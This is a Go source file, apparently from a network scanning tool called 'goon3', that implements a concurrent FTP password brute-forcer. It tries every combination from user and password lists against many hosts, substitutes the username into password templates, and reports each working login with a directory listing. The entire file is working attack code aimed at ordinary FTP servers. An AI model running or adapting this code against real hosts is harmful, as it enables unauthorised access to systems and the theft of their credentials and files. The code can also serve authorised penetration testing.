package brute

import (
	"context"
	"fmt"
	"github.com/jlaffaye/ftp"
	"goon3/public"
	"runtime"
	"strings"
	"time"
)

func Ftp(hosts []string){
	runtime.GOMAXPROCS(runtime.NumCPU())
	input := make(chan BruteInfo,  len(hosts))
	result := make(chan string, len(hosts))
	defer close(input)
	user, pass := []string{},[]string{}
	// 如果用户指定用户文件和密码文件，则使用；否在使用配置文件中的用户密码
	if len(Par.User)>0{
		user = Par.User
	} else {
		user = Par.Brute.Ftp.Info.User
	}
	if len(Par.Pass)>0{
		pass = Par.Pass
	} else {
		pass = Par.Brute.Ftp.Info.Pass
	}
	thread := 10
	if len(hosts) < Par.Thread {
		thread = len(hosts)
	} else {
		thread = Par.Thread
	}
	// 处理扫描数据格式
	go func() {
		CreateInfo(&input,hosts,user,pass)
	}()
	// 开启扫描
	for i := 0; i< thread; i++{
		go ftpWork(input, result)
	}
	// 输出扫描结果
	public.Out(result, Par.Ofile)
}

// 平均时间18s
func ftpWork(input chan BruteInfo,result chan string) {
	for {
		task,ok := <-input
		if !ok{
			return
		}
		pool := BrutePool{}
		brute_result := make(chan string,1)
		brute_pool := make(chan BrutePool,len(task.Users)*len(task.Passs))
		defer close(brute_pool)
		defer close(brute_result)
		// 由上下文统一管理
		ctx, cancel := context.WithTimeout(context.Background(), time.Duration(Par.Timeout+1)*time.Second)
		defer cancel()
		// 新建资源池
		for _, user:= range(task.Users){
			for _, pass:= range(task.Passs){
				pool.Host = task.Host
				pool.User = user
				pool.Pass = pass
				brute_pool <- pool
			}
		}
		// 启动爆破
		for i:=0;i<Par.Thread;i++{
			go ftpConn(ctx, brute_pool, brute_result)
		}
		// 等待回显
		select {
		case <-ctx.Done():
			result <- ""
		case flag := <-brute_result:
			result <- flag
			cancel()
		}
		time.Sleep(1*time.Second)
	}
}

// 只需要返回一个成功的即可
func ftpConn(ctx context.Context, Pool chan BrutePool, scan_result chan string){
	for{
		pool, ok := <-Pool
		if !ok{
			return
		}
		Host, Username, Password := pool.Host, pool.User, pool.Pass
		Password = strings.Replace(Password, "{{user}}", Username, -1)
		/* 建立ftp连接 */
		conn, err := ftp.DialTimeout(Host, time.Duration(Par.Timeout)*time.Second)
		if err == nil {
			defer conn.Quit()
			/* 输入账号密码 */
			err = conn.Login(Username, Password)
			//x := fmt.Sprintf("%s", err)
			if err == nil {
				result := ""
				dirs, err := conn.List("")
				if err == nil {
					if len(dirs) > 0 {
						if len(dirs[0].Name) > 50 {
							result = fmt.Sprintf("[FTP] %-40v %v:%-10v %v", Host, Username, Password,dirs[0].Name[:50])
						} else {
							result = fmt.Sprintf("[FTP] %-40v %v:%-10v %v", Host, Username, Password,dirs[0].Name)
						}
					}
					select {
					case <- ctx.Done():
						return
					default:
						scan_result <- result
					}
				}
			}
		}
	}
}